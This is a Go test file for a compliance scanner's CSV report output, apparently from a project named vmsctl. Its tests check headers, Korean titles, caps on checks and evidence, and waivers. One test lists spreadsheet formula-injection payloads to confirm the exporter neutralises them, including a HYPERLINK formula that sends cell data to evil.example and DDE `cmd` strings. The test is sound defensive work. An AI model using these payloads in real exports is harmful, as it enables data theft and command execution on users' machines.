package output

import (
	"bytes"
	"encoding/csv"
	"strings"
	"testing"

	"github.com/with-developer/vmsctl/internal/engine"
)

func readCSV(t *testing.T, out []byte) [][]string {
	t.Helper()
	if !bytes.HasPrefix(out, []byte("\xef\xbb\xbf")) {
		t.Errorf("the report does not start with a byte order mark (Excel would not read the Korean titles): %q", out[:min(8, len(out))])
	}
	rows, err := csv.NewReader(bytes.NewReader(bytes.TrimPrefix(out, []byte("\xef\xbb\xbf")))).ReadAll()
	if err != nil {
		t.Fatalf("not CSV: %v\n%s", err, out)
	}
	return rows
}

func TestCSVReport(t *testing.T) {
	res := readFixture(t, "web-01.json")
	var buf bytes.Buffer
	if err := Write(&buf, res, "csv", Options{}); err != nil {
		t.Fatal(err)
	}
	rows := readCSV(t, buf.Bytes())
	if got := strings.Join(rows[0], ","); got != "host,profile,control,title,title_ko,severity,status,checks_to_look_at,evidence,how_to_fix,waiver" {
		t.Errorf("header = %s", got)
	}
	if len(rows)-1 != len(res.Controls) {
		t.Errorf("%d rows for %d controls", len(rows)-1, len(res.Controls))
	}
	for i, row := range rows[1:] {
		c := res.Controls[i]
		if len(row) != len(rows[0]) || row[0] != res.Host.Hostname || row[2] != c.ID || row[6] != string(c.Status) {
			t.Errorf("row %d = %q for control %s", i, row, c.ID)
		}
	}
	// A failed control names its checks, the evidence and the fix; a passing one has none of them.
	var failed, passed bool
	for i, row := range rows[1:] {
		switch res.Controls[i].Status {
		case engine.StatusFail:
			if row[7] == "" || row[8] == "" {
				t.Errorf("a failed control without checks or evidence: %q", row)
			}
			failed = true
		case engine.StatusPass:
			if row[7] != "" || row[8] != "" || row[9] != "" {
				t.Errorf("a passing control with checks, evidence or a fix: %q", row)
			}
			passed = true
		default: // the other statuses have no promise to keep here
		}
	}
	if !failed || !passed {
		t.Fatalf("the fixture does not have both a failed and a passing control (failed %v, passed %v)", failed, passed)
	}
}

// What a scan shows comes from the scanned host or from a pack, and a spreadsheet runs a cell that starts with = + - @ as a
// formula: no cell of the report may start with one, whatever the host put in a file name or a configuration value.
func TestCSVIsInertForHostileText(t *testing.T) {
	payloads := []string{
		`=HYPERLINK("http://evil.example/?x="&A1,"click")`, `+cmd|' /C calc'!A0`, `-2+3+cmd|' /C calc'!A0`, `@SUM(1+1)*cmd|' /C calc'!A0`,
		"\t=1+1", "\r=1+1", "=1+1\n=2+2", `"=quoted"`, "a,b\"c", "\x1b[2J", "=" + strings.Repeat("x", 5000),
	}
	for _, payload := range payloads {
		res := readFixture(t, "web-01.json")
		res.Host.Hostname = payload
		res.Controls[0].Title = payload
		res.Controls[0].TitleKo = payload
		res.Controls[0].Status = engine.StatusFail
		for i := range res.Checks {
			res.Checks[i].Status = engine.StatusFail
			res.Checks[i].Remediation = payload
			res.Checks[i].Evidence = []engine.Evidence{{Key: payload, Text: payload, Source: payload}}
		}
		res.Controls[1].Waiver = &engine.WaiverOf{Reason: payload, Expires: "2027-01-01", Scope: "control"}
		var buf bytes.Buffer
		if err := Write(&buf, res, "csv", Options{}); err != nil {
			t.Fatal(err)
		}
		for r, row := range readCSV(t, buf.Bytes()) {
			for c, cell := range row {
				if cell != "" && strings.ContainsRune("=+-@\t\r", rune(cell[0])) {
					t.Errorf("payload %q: row %d column %d starts a formula: %q", payload, r, c, cell)
				}
				if strings.ContainsAny(cell, "\n\r\x1b") {
					t.Errorf("payload %q: row %d column %d has a line break or control character: %q", payload, r, c, cell)
				}
				if len([]rune(cell)) > maxCSVCell+4 {
					t.Errorf("payload %q: row %d column %d is %d characters long", payload, r, c, len([]rune(cell)))
				}
			}
		}
	}
}

func TestCSVKoreanTitlesAreKept(t *testing.T) {
	res := readFixture(t, "web-01.json")
	res.Controls[0].TitleKo = "비밀번호 정책"
	var buf bytes.Buffer
	if err := Write(&buf, res, "csv", Options{}); err != nil {
		t.Fatal(err)
	}
	if rows := readCSV(t, buf.Bytes()); rows[1][4] != "비밀번호 정책" {
		t.Errorf("title_ko = %q", rows[1][4])
	}
}

// A long list of checks or evidence is cut, and says so; the fix of a failed check comes whatever place it is in; a waived
// control keeps its evidence but has no fix; a check the result lacks is named, never an empty row.
func TestCSVCapsAndWaiversAndMissingChecks(t *testing.T) {
	res := &engine.Result{}
	res.Host.Hostname = "web-01"
	var refs []string
	for i := 0; i < 8; i++ {
		ref := "a.check" + string(rune('0'+i))
		refs = append(refs, ref)
		ck := engine.CheckResult{Ref: ref, ID: ref, Status: engine.StatusError}
		if i == 7 {
			ck.Status = engine.StatusFail
			ck.Remediation = "run the fix"
			for e := 0; e < 5; e++ {
				ck.Evidence = append(ck.Evidence, engine.Evidence{Key: "k", Text: "v" + string(rune('0'+e))})
			}
		}
		res.Checks = append(res.Checks, ck)
	}
	res.Controls = []engine.ControlResult{
		{Profile: "p", ID: "C-1", Status: engine.StatusFail, Checks: refs},
		{Profile: "p", ID: "C-2", Status: engine.StatusWaived, Checks: refs[7:], Waiver: &engine.WaiverOf{Reason: "accepted", Expires: "2027-01-01", Scope: "control"}},
		{Profile: "p", ID: "C-3", Status: engine.StatusFail, Checks: []string{"x.missing"}},
	}
	var buf bytes.Buffer
	if err := Write(&buf, res, "csv", Options{}); err != nil {
		t.Fatal(err)
	}
	rows := readCSV(t, buf.Bytes())
	c1, c2, c3 := rows[1], rows[2], rows[3]
	if !strings.Contains(c1[7], "... 3 more") || !strings.HasSuffix(strings.Split(c1[7], "; ")[4], "a.check4") {
		t.Errorf("checks of C-1 = %q, want five and a count of the 3 left out", c1[7])
	}
	if c1[9] != "run the fix" {
		t.Errorf("the fix of C-1 = %q: a failed check after the cap must still give it", c1[9])
	}
	if !strings.Contains(c2[8], "a.check7: k v0") || !strings.Contains(c2[8], "... 2 more in the JSON result") || c2[9] != "" || !strings.Contains(c2[10], "accepted") {
		t.Errorf("C-2 = %q", c2)
	}
	if c3[7] != "x.missing" || !strings.Contains(c3[8], "no detail of this check") {
		t.Errorf("C-3 = %q", c3)
	}
}
